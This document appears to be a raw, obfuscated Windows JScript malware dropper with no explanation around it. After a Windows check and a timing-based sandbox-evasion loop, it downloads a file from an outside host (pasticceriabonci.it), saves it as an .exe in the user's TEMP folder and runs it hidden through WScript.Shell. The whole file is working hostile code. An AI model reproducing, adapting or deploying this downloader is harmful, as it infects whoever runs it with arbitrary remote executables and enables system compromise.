var Mw = false;
var G = "CreateObject";
var N0 = function WY() {return WScript[G]("WScript.Shell");}(), fG = 11;
var h = "MSXML2.XMLHTTP";
var e = 2123213;
var v = 0;
function m(DH){N0["Run"](DH, v, v);};
function bh(){return "" + h;};
function N(G0, n){v = v * 1; return G0 - n;};
function hE(){return G;};
/*@cc_on
  @if (@_win32 || @_win64)
    Mw = true;
  @end
@*/
if (Mw)
{
var s = "";
function Bd(){return 22;};
var y = 0; var tC = 0;
function BN()
{
var JA = new this["Date"]();
var O = JA["getUTCMilliseconds"]();
WScript["Sleep"](Bd());
var JA = new this["Date"]();
var Ry = JA["getUTCMilliseconds"]();
WScript["Sleep"](Bd());
var JA = new this["Date"]();
var a = JA["getUTCMilliseconds"]();
var y = "qc";
y = N(Ry, O);
var tC = "I";
tC = N(a, Ry);
s = "open";
return N(y, tC);
}
var l = false;
var D = false;
for (var wh = v; wh < Bd() * 1; wh++){if (BN() != v){
l = true; 
tC = "31" + 11 * y + tC; 
D = true; 
break;
}}
function R() {return ((l == true) && (l == D)) ? 1 : v;};
if (l && R() && D){
function c() {return N0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "B5SDdiRAXo36Ca.exe";};
 tl = bh();
 xu = WScript[G](tl);
 var A = 1;
 while (A){
try {
xu[s]("GET", "http://pasticceriabonci.it/m1psa", false);
xu["send"]();
V = "Sleep";
for (;;){WScript[V](Bd() * 11); if (xu["readystate"] >= 2 * 2) break;};
A = v;
} catch(b){};
}
function ma(gg) {var UH = (1, 2, 3, 4, 5, gg); return UH;};
OG = WScript[hE()]("ADODB.Stream");
tl = OG;
tl[s]();
tl["type"] = ma(1);
tl["write"](xu["ResponseBody"]);
OG["position"] = ma(v);
tl["Save" + "ToFile"](c(), 2);
OG["c"+"lose"]();
qS = c();
m(qS);
}
}

